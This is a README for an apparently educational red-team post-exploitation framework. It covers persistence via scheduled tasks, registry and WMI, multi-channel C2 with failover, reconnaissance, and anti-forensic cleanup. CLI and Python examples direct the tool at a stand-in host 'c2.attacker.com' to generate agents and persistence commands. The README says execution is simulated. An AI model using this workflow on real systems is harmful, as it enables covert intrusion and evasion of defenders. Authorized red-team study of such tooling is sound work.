# Initial Access Framework

**Professional Post-Exploitation Automation for Authorized Red Team Operations**

A comprehensive, modular framework for orchestrating the critical first 30 minutes of post-exploitation operations. Built for professional red teamers who understand that getting initial access is easy—maintaining it is what separates amateurs from professionals.

## Overview

The Initial Access Framework automates the complete post-exploitation workflow that every professional red team operator runs within the first 30 minutes of gaining access:

1. **Access Verification** (0-5 min) - Confirm shell functionality
2. **Persistence Deployment** (5-10 min) - Install redundant persistence mechanisms
3. **C2 Establishment** (10-15 min) - Configure multi-channel command and control
4. **Initial Enumeration** (15-25 min) - Gather critical situational awareness
5. **Cleanup Configuration** (25-30 min) - Set up automated artifact removal

## Why This Matters

Most operators get caught because they know individual techniques but lack understanding of complete operational workflows. This framework embodies the difference between:

- **Amateur operators**: Get detected in days, lose access quickly
- **Professional operators**: Maintain access for months, operate undetected

## Features

### Core Capabilities

- ✅ **Modular Architecture** - Clean separation of concerns across 7 specialized modules
- ✅ **Multi-Platform Support** - Windows and Linux target systems
- ✅ **Comprehensive Logging** - Every action documented for post-engagement reporting
- ✅ **Session Management** - Track operation state and timing across all phases
- ✅ **Production-Ready** - Professional error handling and edge case coverage

### Operational Modules

#### Access Verification
- Shell connectivity testing
- Command execution validation
- Pre-flight checks before proceeding

#### Persistence Manager
- Multiple redundant mechanisms (Scheduled Tasks, Registry, WMI, Startup)
- Stealth level indicators (low/medium/high)
- Reliability ratings for each method
- Automatic selection of optimal persistence mix

#### C2 Manager
- Multi-channel architecture (HTTPS, DNS, ICMP)
- Automatic failover between channels
- Configurable beacon intervals and jitter
- Session-aware communications

#### Enumeration Manager
- Priority-based command execution (critical/important/nice-to-have)
- Category organization (Identity, System, Network, Users, Security)
- Automated batch script generation
- Platform-specific reconnaissance

#### Cleanup Manager
- Proactive artifact removal (not reactive)
- Frequency-based task scheduling (continuous/hourly/daily/on-exit)
- Risk-level awareness (low/medium/high)
- Automated cleanup scheduling

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/initial-access-framework.git
cd initial-access-framework

# No dependencies required - pure Python 3.6+
# Optional: Create virtual environment
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

## Quick Start

### Basic Usage

```bash
# Run complete initial access protocol
python3 src/initial_access_cli.py -t 10.10.10.50 -c c2.attacker.com

# Specify target platform
python3 src/initial_access_cli.py -t 192.168.1.100 -c c2.example.com --platform linux

# Custom session name
python3 src/initial_access_cli.py -t 10.0.0.5 -c c2.server.com --session "client-engagement-2024"
```

### Verification Only

```bash
# Only verify access without running full protocol
python3 src/initial_access_cli.py -t 10.10.10.50 -c c2.attacker.com --verify-only
```

### Selective Phases

```bash
# Skip persistence deployment
python3 src/initial_access_cli.py -t 10.10.10.50 -c c2.attacker.com --skip-persistence

# Skip cleanup configuration
python3 src/initial_access_cli.py -t 10.10.10.50 -c c2.attacker.com --skip-cleanup
```

## Programmatic Usage

### Simple Integration

```python
from initial_access import InitialAccessHandler

# Initialize handler
handler = InitialAccessHandler(
    target_ip="10.10.10.50",
    c2_server="c2.attacker.com",
    platform="windows"
)

# Execute complete protocol
success = handler.execute_initial_access_protocol()

# Get operation summary
summary = handler.get_operation_summary()
print(f"Session: {summary['session']['session_id']}")
print(f"Duration: {summary['session']['elapsed_time']}")
```

### Individual Module Usage

```python
from initial_access.modules import PersistenceManager, C2Manager, EnumerationManager

# Persistence only
persistence = PersistenceManager(c2_server="c2.attacker.com")
methods = persistence.get_recommended_methods(count=3)
commands = persistence.generate_deployment_commands(methods)

# C2 configuration only
c2 = C2Manager(c2_server="c2.attacker.com")
config = c2.generate_agent_config(session_id="custom-session")
agent_script = c2.generate_powershell_agent(session_id="custom-session")

# Enumeration only
enum = EnumerationManager(platform="windows")
critical_commands = enum.get_critical_commands()
batch_script = enum.generate_batch_script(output_file="recon.txt")
```

## Project Structure

```
initial_access_framework/
├── src/
│   ├── initial_access/
│   │   ├── __init__.py
│   │   ├── core/
│   │   │   ├── __init__.py
│   │   │   ├── session.py          # Session state management
│   │   │   └── operation_log.py    # Comprehensive logging
│   │   ├── modules/
│   │   │   ├── __init__.py
│   │   │   ├── access_verification.py  # Shell verification
│   │   │   ├── persistence.py          # Persistence mechanisms
│   │   │   ├── c2_setup.py             # Multi-channel C2
│   │   │   ├── enumeration.py          # System reconnaissance
│   │   │   └── cleanup.py              # Artifact removal
│   │   └── handlers/
│   │       ├── __init__.py
│   │       └── access_handler.py   # Main orchestration
│   └── initial_access_cli.py       # Command-line interface
├── tests/                          # Unit tests
├── docs/                           # Additional documentation
├── examples/                       # Usage examples
└── README.md                       # This file
```

## Architecture

### Design Philosophy

The framework follows professional software engineering principles:

1. **Separation of Concerns** - Each module has a single, well-defined responsibility
2. **Dependency Injection** - Loose coupling between components
3. **Session Management** - Centralized state tracking across all operations
4. **Comprehensive Logging** - Every action documented for reporting
5. **Error Handling** - Graceful degradation when individual components fail

### Module Interactions

```
InitialAccessHandler (Orchestrator)
    │
    ├── Session (State Management)
    ├── OperationLog (Logging)
    │
    ├── AccessVerifier (Verification)
    ├── PersistenceManager (Persistence)
    ├── C2Manager (Command & Control)
    ├── EnumerationManager (Reconnaissance)
    └── CleanupManager (Anti-Forensics)
```

## Operational Security

### Built-in OpSec Features

- **Multi-Channel C2**: Automatic failover prevents loss of access
- **Redundant Persistence**: Multiple mechanisms ensure survival
- **Automated Cleanup**: Proactive artifact removal from minute one
- **Session Tracking**: Complete audit trail for post-engagement reporting
- **Stealth Indicators**: Each technique rated for detectability

### Best Practices

1. **Verify Before Proceeding** - Always confirm access before deployment
2. **Deploy Persistence Immediately** - Within first 5 minutes of access
3. **Use Multiple C2 Channels** - Never rely on single communication method
4. **Clean As You Go** - Configure automated cleanup from the start
5. **Log Everything** - Maintain comprehensive operation records

## Legal & Ethical Use

⚠️ **CRITICAL NOTICE** ⚠️

This framework is designed **exclusively** for:
- Authorized penetration testing engagements
- Red team operations with explicit written permission
- Security research in controlled environments
- Educational purposes with proper authorization

**UNAUTHORIZED USE IS ILLEGAL**

The developers assume no liability for misuse of this framework. Users are responsible for:
- Obtaining proper authorization before use
- Complying with all applicable laws and regulations
- Using the framework only within authorized scope
- Maintaining ethical standards in all operations

## Contributing

Contributions welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Add tests for new functionality
4. Ensure all tests pass
5. Submit a pull request with clear description

## Development Roadmap

### Planned Features

- [ ] Additional persistence mechanisms (COM hijacking, DLL injection)
- [ ] Extended platform support (macOS, Solaris)
- [ ] Automated report generation
- [ ] Integration with popular C2 frameworks
- [ ] Docker containerization for testing
- [ ] Web-based management interface

### Known Limitations

- Currently simulates actual command execution (production version would integrate with real C2)
- Netcat-based access verification (production would support multiple shell types)
- Limited to English language systems for enumeration parsing

## Support & Documentation

- **Full Documentation**: See `/docs` directory
- **Examples**: See `/examples` directory for common use cases
- **Issues**: Report bugs via GitHub issues
- **Questions**: Open a discussion on GitHub

## Credits

Developed for the **"30 Days of Red Team"** series - a comprehensive cybersecurity education program teaching professional red team methodologies.

**Author**: Thomas (Red Team Operator)
**Series**: [30 Days of Red Team on Medium](https://medium.com/@yourusername)
**GitHub**: [Red Team Toolkit](https://github.com/yourusername/red-team-toolkit)

## License

This project is licensed under the MIT License - see LICENSE file for details.

**Remember**: With great power comes great responsibility. Use wisely, use legally, use ethically.

---

**Built by operators, for operators. 🔴**
